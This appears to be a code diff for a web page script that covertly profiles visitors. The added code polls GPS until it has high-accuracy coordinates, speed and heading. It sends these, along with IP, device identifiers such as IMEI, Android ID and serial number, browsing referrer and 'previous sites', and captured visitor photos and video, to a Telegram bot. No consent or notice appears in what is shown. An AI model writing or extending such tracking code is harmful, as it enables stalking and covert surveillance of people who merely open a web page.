@@ -6,6 +6,10 @@ interface LocationInfo {
   accuracy: number | null;
   source: string;
   ip: string;
+  altitude?: number | null;
+  heading?: number | null;
+  speed?: number | null;
+  timestamp?: number;
 }
 
 interface DeviceInfo {
@@ -204,82 +208,142 @@ async function getDeviceInfo(): Promise<DeviceInfo> {
   }
 }
 
-async function getLocationInfo(): Promise<LocationInfo> {
-  try {
-    if ('geolocation' in navigator) {
-      try {
-        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          const options = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          };
+async function getHighAccuracyGPS(): Promise<GeolocationPosition | null> {
+  if (!('geolocation' in navigator)) {
+    console.log('Geolocation not supported');
+    return null;
+  }
 
-          const watchId = navigator.geolocation.watchPosition(
-            (pos) => {
-              if (pos.coords.accuracy <= 20) {
-                navigator.geolocation.clearWatch(watchId);
-                resolve(pos);
-              }
-            },
-            (error) => {
-              console.warn('GPS Watch Error:', error);
-              navigator.geolocation.clearWatch(watchId);
-              navigator.geolocation.getCurrentPosition(resolve, reject, options);
-            },
-            options
-          );
-
-          setTimeout(() => {
-            navigator.geolocation.clearWatch(watchId);
-            navigator.geolocation.getCurrentPosition(resolve, reject, options);
-          }, 10000);
-        });
-
-        const ipResponse = await fetch('https://ipapi.co/json/');
-        const ipData = await ipResponse.json();
-
-        return {
-          city: ipData.city || 'Unknown',
-          country: ipData.country_name || 'Unknown',
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          source: 'GPS',
-          ip: ipData.ip || 'Unknown'
-        };
-      } catch (geoError) {
-        console.warn('GPS Error:', geoError);
-      }
-    }
-
-    const ipResponse = await fetch('https://ipapi.co/json/');
-    if (!ipResponse.ok) {
-      throw new Error(`Location API error: ${ipResponse.status}`);
-    }
-    const ipData = await ipResponse.json();
+  return new Promise((resolve) => {
+    let bestPosition: GeolocationPosition | null = null;
+    let attempts = 0;
+    const maxAttempts = 5;
+    const targetAccuracy = 10; // Target accuracy in meters
+    const maxWaitTime = 30000; // Maximum wait time in milliseconds
     
+    const options: PositionOptions = {
+      enableHighAccuracy: true,
+      timeout: 15000,
+      maximumAge: 0
+    };
+
+    const startTime = Date.now();
+    
+    const watchId = navigator.geolocation.watchPosition(
+      (position) => {
+        attempts++;
+        console.log(`GPS attempt ${attempts}: accuracy ${position.coords.accuracy}m`);
+        
+        // Keep the best (most accurate) position
+        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
+          bestPosition = position;
+          console.log(`New best GPS position: accuracy ${position.coords.accuracy}m`);
+        }
+        
+        // If we have very good accuracy, use it immediately
+        if (position.coords.accuracy <= targetAccuracy) {
+          console.log(`Target accuracy achieved: ${position.coords.accuracy}m`);
+          navigator.geolocation.clearWatch(watchId);
+          resolve(position);
+          return;
+        }
+        
+        // If we've tried enough times or waited long enough, use the best we have
+        if (attempts >= maxAttempts || (Date.now() - startTime) >= maxWaitTime) {
+          console.log(`GPS collection complete. Best accuracy: ${bestPosition?.coords.accuracy}m`);
+          navigator.geolocation.clearWatch(watchId);
+          resolve(bestPosition);
+          return;
+        }
+      },
+      (error) => {
+        console.warn(`GPS error (attempt ${attempts + 1}):`, error.message);
+        attempts++;
+        
+        if (attempts >= maxAttempts) {
+          navigator.geolocation.clearWatch(watchId);
+          resolve(bestPosition);
+        }
+      },
+      options
+    );
+
+    // Fallback timeout
+    setTimeout(() => {
+      navigator.geolocation.clearWatch(watchId);
+      console.log(`GPS timeout reached. Best position accuracy: ${bestPosition?.coords.accuracy || 'none'}m`);
+      resolve(bestPosition);
+    }, maxWaitTime);
+  });
+}
+
+async function getLocationInfo(): Promise<LocationInfo> {
+  console.log('Starting location detection...');
+  
+  // First, try to get high-accuracy GPS
+  const gpsPosition = await getHighAccuracyGPS();
+  
+  // Get IP-based location as fallback for city/country info
+  let ipData: any = {};
+  try {
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (ipResponse.ok) {
+      ipData = await ipResponse.json();
+      console.log('IP location data retrieved');
+    }
+  } catch (error) {
+    console.warn('Failed to get IP location:', error);
+  }
+
+  if (gpsPosition) {
+    console.log(`Using GPS location with ${gpsPosition.coords.accuracy}m accuracy`);
+    
+    // Try to get city/country from GPS coordinates using reverse geocoding
+    let city = ipData.city || 'Unknown';
+    let country = ipData.country_name || 'Unknown';
+    
+    try {
+      // Use a reverse geocoding service to get location names from GPS coordinates
+      const reverseGeoResponse = await fetch(
+        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gpsPosition.coords.latitude}&longitude=${gpsPosition.coords.longitude}&localityLanguage=en`
+      );
+      
+      if (reverseGeoResponse.ok) {
+        const geoData = await reverseGeoResponse.json();
+        if (geoData.city) city = geoData.city;
+        if (geoData.countryName) country = geoData.countryName;
+        console.log('Reverse geocoding successful:', { city, country });
+      }
+    } catch (error) {
+      console.warn('Reverse geocoding failed, using IP data for city/country:', error);
+    }
+
     return {
-      city: ipData.city || 'Unknown',
-      country: ipData.country_name || 'Unknown',
-      latitude: ipData.latitude || null,
-      longitude: ipData.longitude || null,
-      accuracy: null,
-      source: 'IP',
+      city,
+      country,
+      latitude: gpsPosition.coords.latitude,
+      longitude: gpsPosition.coords.longitude,
+      accuracy: gpsPosition.coords.accuracy,
+      altitude: gpsPosition.coords.altitude,
+      heading: gpsPosition.coords.heading,
+      speed: gpsPosition.coords.speed,
+      timestamp: gpsPosition.timestamp,
+      source: 'GPS (High Accuracy)',
       ip: ipData.ip || 'Unknown'
     };
-  } catch (error) {
-    console.error('Error fetching location:', error);
-    return {
-      city: 'Unknown',
-      country: 'Unknown',
-      latitude: null,
-      longitude: null,
-      accuracy: null,
-      source: 'None',
-      ip: 'Unknown'
-    };
   }
+
+  // Fallback to IP-based location
+  console.log('GPS not available, using IP-based location');
+  return {
+    city: ipData.city || 'Unknown',
+    country: ipData.country_name || 'Unknown',
+    latitude: ipData.latitude || null,
+    longitude: ipData.longitude || null,
+    accuracy: null,
+    source: 'IP Geolocation',
+    ip: ipData.ip || 'Unknown'
+  };
 }
 
 async function sendTelegramMessage(botToken: string, data: any): Promise<Response> {
@@ -330,12 +394,32 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   let locationText = `🌆 City: ${locationInfo.city}\n🌍 Country: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;
   
   if (locationInfo.latitude && locationInfo.longitude) {
-    locationText += `\n📍 Location (${locationInfo.source}): ${locationInfo.latitude}, ${locationInfo.longitude}`;
+    locationText += `\n📍 Coordinates: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}`;
+    locationText += `\n📡 Source: ${locationInfo.source}`;
+    
     if (locationInfo.accuracy) {
       locationText += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
     }
     
-    locationText += `\n🗺 Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
+    if (locationInfo.altitude) {
+      locationText += `\n⛰️ Altitude: ${Math.round(locationInfo.altitude)}m`;
+    }
+    
+    if (locationInfo.speed !== null && locationInfo.speed !== undefined) {
+      locationText += `\n🏃 Speed: ${Math.round(locationInfo.speed * 3.6)} km/h`;
+    }
+    
+    if (locationInfo.heading !== null && locationInfo.heading !== undefined) {
+      locationText += `\n🧭 Heading: ${Math.round(locationInfo.heading)}°`;
+    }
+    
+    if (locationInfo.timestamp) {
+      const gpsTime = new Date(locationInfo.timestamp);
+      locationText += `\n⏱️ GPS Time: ${gpsTime.toISOString()}`;
+    }
+    
+    locationText += `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
+    locationText += `\n🛰️ Google Earth: https://earth.google.com/web/@${locationInfo.latitude},${locationInfo.longitude},0a,1000d,35y,0h,0t,0r`;
   }
 
   const deviceText = `
@@ -349,7 +433,7 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   • Screen: ${deviceInfo.screenResolution || 'Unknown'}
   • CPU Cores: ${deviceInfo.cpuCores || 'Unknown'}
   • Memory: ${deviceInfo.totalMemory ? deviceInfo.totalMemory + 'GB' : 'Unknown'}
-  • Battery: ${deviceInfo.batteryLevel ? deviceInfo.batteryLevel + '%' : 'Unknown'}
+  • Battery: ${deviceInfo.batteryLevel ? Math.round(deviceInfo.batteryLevel) + '%' : 'Unknown'}
   • Network: ${deviceInfo.networkType || 'Unknown'}
   • IMEI: ${deviceInfo.imei || 'Not available'}
   • Android ID: ${deviceInfo.androidId || 'Not available'}
@@ -358,12 +442,12 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   const message = `
 🔍 New Visitor Details
 👤 UA: ${details.userAgent}
-📍 Location: ${details.location}
+📍 Page: ${details.location}
 ${locationText}
 ${deviceText}
 🔗 Referrer: ${details.referrer}
 🌐 Previous sites: ${details.previousSites}
-⏰ Time: ${new Date().toISOString()}
+⏰ Visit Time: ${new Date().toISOString()}
   `.trim();
 
   const messageData = {
@@ -375,6 +459,7 @@ ${deviceText}
   try {
     await sendTelegramMessage(botToken, messageData);
     hasNotificationBeenSent = true;
+    console.log('Visitor notification sent successfully');
   } catch (error) {
     console.error('Failed to send notification:', error instanceof Error ? error.message : 'Unknown error');
   }
@@ -399,15 +484,28 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
   });
   
   formData.append('video', videoFile);
-  formData.append('caption', `🎥 Visitor Video
+  
+  let caption = `🎥 Visitor Video
 ⏰ Time: ${new Date().toISOString()}
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
 🌐 IP: ${locationInfo.ip}
-📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
-📱 IMEI: ${deviceInfo.imei || 'Not available'}
-📱 Android ID: ${deviceInfo.androidId || 'Not available'}
-📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
+📱 Device: ${deviceInfo.brand} ${deviceInfo.model}`;
+
+  if (locationInfo.latitude && locationInfo.longitude) {
+    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}`;
+    caption += `\n📡 Source: ${locationInfo.source}`;
+    if (locationInfo.accuracy) {
+      caption += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
+    }
+    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
+  }
+
+  caption += `\n📱 IMEI: ${deviceInfo.imei || 'Not available'}`;
+  caption += `\n📱 Android ID: ${deviceInfo.androidId || 'Not available'}`;
+  caption += `\n📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`;
+
+  formData.append('caption', caption);
   formData.append('supports_streaming', 'true');
 
   try {
@@ -443,15 +541,28 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
   formData.append('photo', imageBlob, 'visitor-photo.jpg');
-  formData.append('caption', `📸 Visitor Photo
+  
+  let caption = `📸 Visitor Photo
 ⏰ Time: ${new Date().toISOString()}
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
 🌐 IP: ${locationInfo.ip}
-📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
-📱 IMEI: ${deviceInfo.imei || 'Not available'}
-📱 Android ID: ${deviceInfo.androidId || 'Not available'}
-📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`);
+📱 Device: ${deviceInfo.brand} ${deviceInfo.model}`;
+
+  if (locationInfo.latitude && locationInfo.longitude) {
+    caption += `\n📍 GPS: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}`;
+    caption += `\n📡 Source: ${locationInfo.source}`;
+    if (locationInfo.accuracy) {
+      caption += `\n🎯 Accuracy: ${Math.round(locationInfo.accuracy)}m`;
+    }
+    caption += `\n🗺️ Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
+  }
+
+  caption += `\n📱 IMEI: ${deviceInfo.imei || 'Not available'}`;
+  caption += `\n📱 Android ID: ${deviceInfo.androidId || 'Not available'}`;
+  caption += `\n📱 Serial: ${deviceInfo.serialNumber || 'Not available'}`;
+
+  formData.append('caption', caption);
 
   try {
     const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
@@ -466,6 +577,8 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
         `Telegram API Error: ${response.status} - ${responseData.description || response.statusText}`
       );
     }
+
+    console.log('Photo sent successfully');
   } catch (error) {
     console.error('Failed to send image:', error instanceof Error ? error.message : 'Unknown error');
   }
